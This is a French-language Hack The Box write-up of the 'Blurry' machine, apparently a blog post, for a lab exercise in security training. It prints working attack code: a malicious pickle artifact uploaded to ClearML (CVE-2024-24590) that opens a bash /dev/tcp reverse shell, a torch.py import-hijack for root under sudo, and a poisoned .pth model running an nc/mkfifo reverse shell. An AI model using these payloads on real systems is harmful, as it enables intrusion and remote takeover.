---
date: 2024-10-10T19:31:38-05:00
# description: ""
image: "/images/HTB-Blurry/Blurry.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Blurry"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Blurry](https://app.hackthebox.com/machines/Blurry)
* Niveau: Moyen
* OS: Linux
---

[Lire cet article en anglais](https://scorpiosec.com/posts/htb-blurry/)

La machine Blurry démontre comment les modules Python et les fonctionnalités spécifiques de Python peuvent être exploités pour compromettre des systèmes. Le défi commence par l'accès à une instance ClearML, contenant diverses expériences liées à un projet. En utilisant le `CVE-2024-24590`, nous obtenons notre accès initial en téléchargeant un artefact malveillant via l'API sur la cible, ce qui nous permet de récupérer le drapeau utilisateur (user.txt). Cet article présentera deux méthodes distinctes d'escalade des privilèges, illustrant différentes approches pour compromettre complètement le système.

Addresse IP cible - `10.10.11.19`


## Balayage

```
./nmap_scan.sh 10.10.11.19 Blurry
```

**Results**

```shell
Running detailed scan on open ports: 22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-10 19:38 CDT
Nmap scan report for 10.10.11.19
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.40 seconds
```

Notre scan nmap découvre deux ports ouverts 22 (SSH) et 80 (HTTP). Nous notons également une redirection vers `app.blurry.htb`, à laquelle nous accéderons après mise à jour de notre fichier hosts.

```
sudo echo "10.10.11.19 blurry.htb app.blurry.htb" | sudo tee -a /etc/hosts
```

## Enumération 

Sur `http://app.blurry.htb/` nous trouvons une instance ClearML à laquelle nous pouvons nous connecter avec le nom d'utilisateur `Chad Jippity`. Sur la page Github, nous lisons que cette solution est utilisée à différentes fins telles que le machine learning, le MLOps, l'automatisation, etc.
_[Source](https://github.com/allegroai/clearml)_

![ClearML website](/images/HTB-Blurry/ClearML_website.png)

Nous ne trouvons rien qui sorte de l'ordinaire sur le site web. L'énumération des sous-domaines nous permet d'obtenir deux autres résultats: `files` et `chat`.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://blurry.htb -H "Host: FUZZ.blurry.htb" -ic -fs 169
```

![Blurry subdomain enumeration](/images/HTB-Blurry/blurry_ffuf.png)

En entrant dans le projet `Black Swan`, nous trouvons différentes tâches sous `Experiments`.

![Blurry Experiments section](/images/HTB-Blurry/blurry_experiments.png)

Un clic droit sur l'un des jobs et la sélection de `Details` montre qu'il y a un script qui gère les tâches (`review_tasks.py`) dans l'image ci-dessous.

![Blurry Experiments details](/images/HTB-Blurry/experiment_details.png)

Des recherches nous permettent de découvrir plusieurs vulnérabilités liées à ClearML, détaillées [ici](https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/).

Sous la section de l'article `Manipulating the Platform to Work for us` nous obtenons du code pour exploiter ClearML avec le `CVE-2024-24590`. Nous devons créer un artefact malveillant et le télécharger sur la cible.

![Malicious artifact](/images/HTB-Blurry/malicious_artifact.png)

![Malicious artifact upload](/images/HTB-Blurry/malicious_artifact_upload.png)

## Accès Initial

Tout d'abord, connectons notre machine locale au serveur ClearML. Sous le projet `Black Swan`, cliquez sur `New experiment`.

![ClearML new experiment](/images/HTB-Blurry/clearml_new_experiment.png)

Un guide explique comment le configurer. Complétez la configuration comme demandé.

1. Installez `clearml`

```
pip install clearml
```

2. Exécutez la commande ci-dessous pour initialiser ClearML

```
clearml-init
```

3. Lorsque le message `Paste copied configuration here` apparaît, utilisez le code que vous avez généré après avoir cliqué sur `CREATE NEW CREDENTIALS`. Vous devez ajouter `api.blurry.htb` à votre fichier hosts autrement la configuration échouera.

![ClearML configuartion steps](/images/HTB-Blurry/clearml_config_steps.png)

Si la configuration est réussie, vous serez informé par des messages sur le terminal.

![ClearML successful configuration](/images/HTB-Blurry/ClearML_success_config.png)

4. Nous pouvons maintenant télécharger un artefact malveillant afin d'obtenir un reverse shell, après exécution du script ci-dessous, nous obtenons un shell sur notre listener en tant que `jippity` et trouvons le drapeau utilisateur dans `/home/jippity`.

```python
import pickle, os

class RunCommand:
    def __reduce__(self):
        return (os.system, ('/bin/bash -c "/bin/bash -i >& /dev/tcp/IP/PORT 0>&1"',))

command = RunCommand()

from clearml import Task
task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"])
task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")
```

![Blurry user flag](/images/HTB-Blurry/blurry_user_flag.png)

## Elévation de Privilèges

Avec `sudo -l` nous apprenons que l'utilisateur `jippity` a la permission de lancer la commande `evaluate_model` sur n'importe quel fichier `.pth` dans le répertoire `/models` en tant que root sans fournir de mot de passe.

![Blurry sudo -l](/images/HTB-Blurry/sudo-l_cmd.png)

### Python Import hijacking (détournement d'importation)

Dans `/models` nous trouvons deux fichiers `demo_model.pth`, et `evaluate_model.py`. Le script utilise `import sys` qui "fournit diverses fonctions et variables qui sont utilisées pour manipuler différentes parties de l'environnement d'exécution de Python.". _[Source](https://www.geeksforgeeks.org/python-sys-module/)_

Puisqu'il n'y a pas de spécifications liées au module, nous pourrions être en mesure de faire un détournement d'importation sous python.

![evaluate_model script import functions](/images/HTB-Blurry/evaluate_model_script.png)

Nous commençons par créer un script malveillant `torch.py`.

```
echo 'import os; os.system("bash")' > /models/torch.py
```

![Malicious torch.py](/images/HTB-Blurry/malicious_torch_py.png)

Ensuite, nous exécutons `evaluate_model` avec sudo.

```
sudo /usr/bin/evaluate_model /models/demo_model.pth
```

Un shell root est créé, nous permettant de lire le drapeau root situé dans `/root`.

![blurry root flag](/images/HTB-Blurry/blurry_root_flag.png)

#### Explication de l'exploitation

Lorsqu'un script Python importe un module (tel que `torch`), Python recherche le module à différents endroits, en commençant par le répertoire actuel (qui est `/models` dans notre cas). Puisque nous avons créé un fichier appelé `torch.py` dans le répertoire `/models`, Python importe notre script malveillant `torch.py` au lieu de la bibliothèque torch.

Après l'importation, notre fichier est exécuté et puisque le script (`evaluate_model.py`) est exécuté en tant que sudo, nous obtenons un shell root.

### Désérialisation Pickle

Nous pouvons également exploiter la cible via la désérialisation pickle. Utilisons un script python pour générer un fichier modèle malveillant.

```python
import torch
import torch.nn as nn
import torch.nn.functional as F
import os


class CustomModel(nn.Module):
    def __init__(self):
        super(CustomModel, self).__init__()
        self.linear = nn.Linear(512, 1)

    def forward(self, x):
        return self.linear(x)
    def __reduce__(self):
        return (os.system, ('echo Going for $USER on $HOSTNAME at $(date);rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc YOUR_IP PORT_NUMBER >/tmp/f',))

model = CustomModel()

torch.save(model, 'root.pth')
```

Après l'exécution du script (`root.py`), nous obtenons un fichier appelé `root.pth`.

![malicious model file](/images/HTB-Blurry/malicious_model_file.png)

L'exécution de la commande `sudo /usr/bin/evaluate_model /models/root.pth` nous donne un shell root sur notre listener.

![root shell](/images/HTB-Blurry/root_shell.png)

#### Explication de l'exploitation

Nous profitons de l'insécurité inhérente du module `pickle`. Lorsque `torch.save` est utilisé pour sauvegarder un modèle dans un fichier `.pth`, il s'appuie sur le module `pickle` pour sérialiser l'objet, et la méthode `__reduce__` (où nous plaçons notre commande malveillante) dicte ce qui se passe au cours de ce processus.

![pickle module](/images/HTB-Blurry/pickle_module.png)
_[Source](https://docs.python.org/3/library/pickle.html)_

Dans la classe `CustomModel`, la méthode `__reduce__` définit comment l'objet est sérialisé lorsqu'il est sauvegardé et comment il sera désérialisé lorsqu'il sera chargé. Cette méthode contient également notre commande reverse shell. Lorsque `torch.save(model, 'root.pth')` est invoqué, le modèle est sérialisé, et durant ce processus, notre méthode `__reduce__` indique à pickle de stocker une commande qui sera exécutée lorsque le modèle sera désérialisé.

Lorsque nous exécutons sudo `/usr/bin/evaluate_model /models/root.pth`, le script `evaluate_model.py` tente de charger le modèle en utilisant `torch.load`. Cela désérialise le modèle et déclenche la méthode `__reduce__` dans notre classe `CustomModel`, ce qui amène Python à exécuter la commande malveillante (dans ce cas, notre reverse shell).

J'ai pris beaucoup de plaisir à faire des recherches sur ces chemins d'exploitation et j'ai pu apprendre beaucoup de choses. Je vous remercie d'avoir lu cet article et j'espère qu'il vous a été utile!
